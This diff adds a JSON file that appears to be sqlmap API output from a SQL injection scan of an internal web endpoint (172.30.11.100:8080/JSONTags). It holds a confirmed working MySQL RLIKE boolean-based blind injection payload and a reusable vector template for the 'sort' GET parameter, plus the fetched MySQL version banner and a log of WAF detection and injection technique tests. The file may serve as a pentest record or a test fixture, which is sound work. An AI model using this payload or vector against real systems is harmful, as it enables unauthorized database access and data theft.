@@ -1,0 +1,221 @@
+{
+    "data_response": {
+        "data": [
+            {
+                "status": 1,
+                "type": 0,
+                "value": {
+                    "data": null,
+                    "query": "start=0&count=10&sort=tagname",
+                    "url": "http://172.30.11.100:8080/JSONTags"
+                }
+            },
+            {
+                "status": 1,
+                "type": 1,
+                "value": [
+                    {
+                        "clause": [
+                            1,
+                            2,
+                            3
+                        ],
+                        "conf": {
+                            "code": null,
+                            "notString": null,
+                            "optimize": false,
+                            "regexp": null,
+                            "string": null,
+                            "textOnly": false,
+                            "titles": false
+                        },
+                        "data": {
+                            "1": {
+                                "comment": "",
+                                "falseCode": 200,
+                                "matchRatio": 0.023,
+                                "payload": "start=0&count=10&sort=tagname RLIKE (SELECT (CASE WHEN (5668=5668) THEN 0x7461676e616d65 ELSE 0x28 END))",
+                                "templatePayload": null,
+                                "title": "MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause",
+                                "trueCode": 200,
+                                "vector": "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))",
+                                "where": 1
+                            }
+                        },
+                        "dbms": "MySQL",
+                        "dbms_version": null,
+                        "notes": [],
+                        "os": null,
+                        "parameter": "sort",
+                        "place": "GET",
+                        "prefix": "",
+                        "ptype": 1,
+                        "suffix": ""
+                    }
+                ]
+            },
+            {
+                "status": 1,
+                "type": 3,
+                "value": "5.7.17-0ubuntu0.16.04.1"
+            }
+        ],
+        "error": [],
+        "success": true
+    },
+    "log_response": {
+        "log": [
+            {
+                "level": "INFO",
+                "message": "testing connection to the target URL",
+                "time": "20:59:04"
+            },
+            {
+                "level": "INFO",
+                "message": "checking if the target is protected by some kind of WAF/IPS/IDS",
+                "time": "20:59:04"
+            },
+            {
+                "level": "CRITICAL",
+                "message": "heuristics detected that the target is protected by some kind of WAF/IPS/IDS",
+                "time": "20:59:04"
+            },
+            {
+                "level": "WARNING",
+                "message": "dropping timeout to 10 seconds (i.e. '--timeout=10')",
+                "time": "20:59:04"
+            },
+            {
+                "level": "INFO",
+                "message": "testing if the target URL is stable",
+                "time": "20:59:04"
+            },
+            {
+                "level": "WARNING",
+                "message": "heuristic (basic) test shows that GET parameter 'sort' might not be injectable",
+                "time": "20:59:05"
+            },
+            {
+                "level": "INFO",
+                "message": "testing for SQL injection on GET parameter 'sort'",
+                "time": "20:59:05"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'AND boolean-based blind - WHERE or HAVING clause'",
+                "time": "20:59:05"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)'",
+                "time": "20:59:07"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'",
+                "time": "20:59:08"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'",
+                "time": "20:59:09"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'",
+                "time": "20:59:10"
+            },
+            {
+                "level": "INFO",
+                "message": "GET parameter 'sort' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable ",
+                "time": "20:59:10"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'Generic UNION query (NULL) - 1 to 20 columns'",
+                "time": "20:59:10"
+            },
+            {
+                "level": "INFO",
+                "message": "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found",
+                "time": "20:59:10"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'Generic UNION query (random number) - 1 to 20 columns'",
+                "time": "20:59:11"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'Generic UNION query (NULL) - 21 to 40 columns'",
+                "time": "20:59:11"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'Generic UNION query (random number) - 21 to 40 columns'",
+                "time": "20:59:12"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'Generic UNION query (NULL) - 41 to 60 columns'",
+                "time": "20:59:12"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'Generic UNION query (random number) - 41 to 60 columns'",
+                "time": "20:59:13"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'Generic UNION query (NULL) - 61 to 80 columns'",
+                "time": "20:59:14"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'Generic UNION query (random number) - 61 to 80 columns'",
+                "time": "20:59:15"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'Generic UNION query (NULL) - 81 to 100 columns'",
+                "time": "20:59:16"
+            },
+            {
+                "level": "INFO",
+                "message": "testing 'Generic UNION query (random number) - 81 to 100 columns'",
+                "time": "20:59:18"
+            },
+            {
+                "level": "INFO",
+                "message": "checking if the injection point on GET parameter 'sort' is a false positive",
+                "time": "20:59:19"
+            },
+            {
+                "level": "INFO",
+                "message": "testing MySQL",
+                "time": "20:59:19"
+            },
+            {
+                "level": "INFO",
+                "message": "confirming MySQL",
+                "time": "20:59:19"
+            },
+            {
+                "level": "INFO",
+                "message": "the back-end DBMS is MySQL",
+                "time": "20:59:19"
+            },
+            {
+                "level": "INFO",
+                "message": "fetching banner",
+                "time": "20:59:19"
+            },
+            {
+                "level": "WARNING",
+                "message": "running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval",
+                "time": "20:59:19"
+            }
+        ],
+        "success": true
+    }
+}
